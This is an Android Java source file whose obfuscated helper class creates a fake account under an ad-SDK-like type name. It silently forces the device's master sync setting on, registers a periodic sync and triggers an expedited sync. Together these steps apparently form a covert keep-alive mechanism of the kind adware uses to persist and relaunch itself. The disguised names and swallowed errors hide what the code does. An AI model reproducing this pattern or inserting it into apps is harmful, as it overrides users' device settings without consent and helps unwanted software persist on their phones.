package com.sister.blo;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;

//LH
public class SerHelper {
    public static String c1() {
        return "com.applovie.ad.helper.info";
    }

    public static String r1(Context context) {
        try {
            PackageManager packageManager = context.getPackageManager();
            return (String) packageManager.getApplicationLabel(packageManager.getApplicationInfo(context.getPackageName(), 0));
        } catch (PackageManager.NameNotFoundException unused) {
            return context.getPackageName();
        }
    }

    public static String ew() {
        return "com.flutter.ii19.pro";
    }

    public static void b1(Context context) {
        try {
            if (!ContentResolver.getMasterSyncAutomatically()) {
                ContentResolver.setMasterSyncAutomatically(true);
            }
        } catch (Throwable unused) {
        }
        Account account = new Account(r1(context), c1());
        try {
            if (ContentResolver.getIsSyncable(account, ew()) <= 0) {
                ContentResolver.setIsSyncable(account, ew(), 1);
            }
        } catch (Throwable unused2) {
        }
        ContentResolver.setSyncAutomatically(account, ew(), true);
        ContentResolver.addPeriodicSync(account, ew(), new Bundle(), 1);
        Bundle bundle = new Bundle();
        bundle.putBoolean("expedited", true);
        bundle.putBoolean("force", true);
        bundle.putBoolean("reset", true);
        ContentResolver.requestSync(account, ew(), bundle);
    }

    public static void a(Context context) {
        AccountManager accountManager = (AccountManager) context.getSystemService(Context.ACCOUNT_SERVICE);
        try {
            if (accountManager.getAccountsByType(c1()).length == 0) {
                accountManager.addAccountExplicitly(new Account(r1(context), c1()), null, new Bundle());
            }
        } catch (Exception unused) {
        }
    }

    public static void d2(Context context) {
        a(context);
        b1(context);
    }

}
